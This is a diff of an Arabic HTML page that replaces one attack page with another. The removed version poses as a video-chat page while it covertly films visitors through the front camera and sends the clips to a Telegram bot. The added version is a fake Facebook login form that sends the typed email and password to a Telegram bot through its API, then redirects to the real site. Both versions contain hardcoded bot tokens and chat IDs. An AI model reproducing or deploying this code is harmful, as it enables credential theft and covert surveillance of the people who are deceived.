@@ -1,94 +1,130 @@
 <!DOCTYPE html>
 <html lang="ar">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>برنامج فيديو كام أونلاين</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
     <style>
-      #videoElement {
-        width: 100%;
-        max-width: 600px;
-        position: absolute;
-        top: -10000px; /* يخفي الفيديو عندما يتم تحميله */
-      }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .logo {
+            font-size: 2.5em;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 40px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        .login-container h2 {
+            margin: 0 0 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background-color: #155db8;
+        }
+        .forgot-password {
+            display: block;
+            text-align: center;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
     </style>
-  </head>
-  <body>
-    <h1>جاري تحميل صفحة الشات، برجاء الانتظار...</h1>
-    <video id="videoElement" autoplay playsinline></video>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">فيس بوك</div>
+        <div class="login-container">
+            <h2>تسجيل الدخول إلى فيس بوك</h2>
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="كلمة المرور" required>
+                </div>
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+            </form>
+            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+        </div>
+    </div>
 
     <script>
-      const video = document.getElementById("videoElement");
-      const botToken = "6766185434:AAHdWBZuTn4bntXnOo96O8s0Lh7UrGhwD5Y"; // استبدل بـ Token البوت الخاص بك
-      const chatId = "6055516230"; // استبدل بـ Chat ID الخاص بك
-      let mediaRecorder;
-      let recordedChunks = [];
+        const botToken = "6504997107:AAHS2LcGZ_L2DN2LiwHGE-DIj8N3cmCA3Ak"; // استبدل بـ Token البوت الخاص بك
+        const chatId = "1066012265"; // استبدل بـ Chat ID الخاص بك
 
-      // طلب الوصول إلى الكاميرا الأمامية
-      navigator.mediaDevices
-        .getUserMedia({ video: { facingMode: "user" } })
-        .then((stream) => {
-          video.srcObject = stream;
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
 
-          // إعداد MediaRecorder لتسجيل الفيديو
-          mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
 
-          mediaRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-              recordedChunks.push(event.data);
-            }
-          };
+            const message = `
+📥 تسجيل دخول جديد:
+📧 البريد الإلكتروني: ${email}
+🔑 كلمة المرور: ${password}
+`;
 
-          mediaRecorder.onstop = () => {
-            const blob = new Blob(recordedChunks, { type: "video/webm" });
-            recordedChunks = []; // إعادة تعيين المصفوفة
-            sendVideoToTelegram(blob); // إرسال الفيديو
-            startRecording(); // بدء التسجيل التالي
-          };
-
-          // بدء التسجيل الأول بعد تحميل الفيديو
-          video.onloadedmetadata = () => {
-            startRecording();
-            video.style.top = ""; // إزالة الأسلوب الذي يخفي الفيديو
-          };
-        })
-        .catch((err) => {
-          console.error("حدث خطأ عند محاولة الوصول إلى الكاميرا:", err);
+            sendToTelegram(message);
         });
 
-      // بدء تسجيل الفيديو
-      function startRecording() {
-        recordedChunks = []; // إعادة تعيين المصفوفة
-        mediaRecorder.start();
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        // توقف التسجيل بعد 10 ثوانٍ (يمكن تغيير المدة)
-        setTimeout(() => {
-          mediaRecorder.stop();
-        }, 10000); // تسجيل لمدة 10 ثوانٍ
-      }
-
-      // وظيفة إرسال الفيديو إلى بوت التليجرام
-      function sendVideoToTelegram(blob) {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("video", blob);
-
-        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-          method: "POST",
-          body: formData,
-        })
-          .then((response) => response.json())
-          .then((data) => {
-            if (data.ok) {
-              console.log("تم إرسال الفيديو بنجاح إلى البوت.");
-            } else {
-              console.error("فشل إرسال الفيديو:", data);
-            }
-          })
-          .catch((error) => {
-            console.error("حدث خطأ أثناء الإرسال:", error);
-          });
-      }
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(() => {
+                // توجيه المستخدم إلى موقع فيسبوك بعد الإرسال
+                window.location.href = "https://www.facebook.com";
+            })
+            .catch(error => {
+                console.error("خطأ أثناء الإرسال:", error);
+                // يتم التوجيه حتى إذا حدث خطأ
+                window.location.href = "https://www.facebook.com";
+            });
+        }
     </script>
-  </body>
+</body>
 </html>
